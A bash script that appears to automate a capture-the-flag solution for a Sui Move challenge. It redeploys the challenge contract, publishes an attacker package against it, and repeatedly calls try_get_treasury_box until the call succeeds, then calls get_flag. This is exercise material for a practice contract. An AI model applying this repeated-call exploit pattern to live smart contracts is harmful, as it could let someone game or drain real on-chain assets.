#!/bin/bash

function replace_game_package_id {
  GAME_PACKAGE_ID=$1

cat << EOF > ./movectf-6/Move.toml
[package]
name = "ctf"
version = "0.0.1"

[dependencies]
Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework", rev = "devnet" }

[addresses]
ctf = $GAME_PACKAGE_ID
game = $GAME_PACKAGE_ID
sui = "0x2"
EOF
}

function get_flag {
    echo "Getting flag..."
    hash=$(./scripts/redeploy_contract.sh | jq -c  '.data.transactionDigest')
    echo "Contract deploy Hash: $hash"

    deployInfo=$(./scripts/get_transaction.sh "$hash")
    echo "Deploy info: $deployInfo"

    object0Type=$(echo "$deployInfo" | jq -c ".result.effects.created[0].owner")
    echo "object0Type: $object0Type"

    object1Type=$(echo "$deployInfo" | jq -c ".result.effects.created[1].owner")
    echo "object1Type: $object1Type"

    if [[ "$object0Type" == *"Immutable"* ]]; then
      gamePackageId=$(echo "$deployInfo" | jq -c ".result.effects.created[0].reference.objectId")
      echo "object0Type gamePackageId: $gamePackageId"
    else
      heroObjectId=$(echo "$deployInfo" | jq -c ".result.effects.created[0].reference.objectId")
      echo "object0Type heroObjectId: $heroObjectId"
    fi

    if [[ "$object1Type" == *"Immutable"* ]]; then
      gamePackageId=$(echo "$deployInfo" | jq -c ".result.effects.created[1].reference.objectId")
      echo "object1Type gamePackageId: $gamePackageId"
    else
      heroObjectId=$(echo "$deployInfo" | jq -c ".result.effects.created[1].reference.objectId")
      echo "object1Type heroObjectId: $heroObjectId"
    fi

    replace_game_package_id "$gamePackageId"

    echo "Publish package..."
    publishOutput=$(sui client publish --gas-budget 100000)
    echo "Publish output: $publishOutput"

    newPackageID=$(echo "$publishOutput" | grep "ID" | grep "Immutable" | awk '{print $3}')
    echo "newPackageID: $newPackageID"

    echo "Try get treasury box ..."
    getBoxOutput=$(sui client call --json --function try_get_treasury_box --module test_ctf --package $newPackageID --gas-budget 1000000 --args $heroObjectId)
    echo "$getBoxOutput" > output/get_box_output.json
    createdBody=$(echo "$getBoxOutput" | jq -c ".[1].created")
    echo "Get box output: $createdBody"

    treasuryBoxID=$(echo "$getBoxOutput" | jq -c ".[1].created[0].reference.objectId")
    echo "treasuryBoxID: $treasuryBoxID"

    if [[ "$treasuryBoxID" != "null" ]]; then
      date=$(date '+%Y%m%d%H%M%S')
      echo "Get flag..."
      getFlagOutput=$(sui client call --json --function get_flag --module test_ctf --package $newPackageID --gas-budget 1000000 --args $treasuryBoxID)
      echo "$getFlagOutput" > output/getFlagOutput_$treasuryBoxID_$date.json
      echo "Get flag output: $getFlagOutput"

      if [[ "$getFlagOutput" == *"moveEvent"* ]]; then
        echo "Success get Flag!"
        exit 0
      else
        echo "Flag not found"
      fi
    fi
}

function loop_get_flag {
  while true; do
    echo ""
    echo "Try get flag..."
    get_flag
    sleep 1
  done
}

loop_get_flag
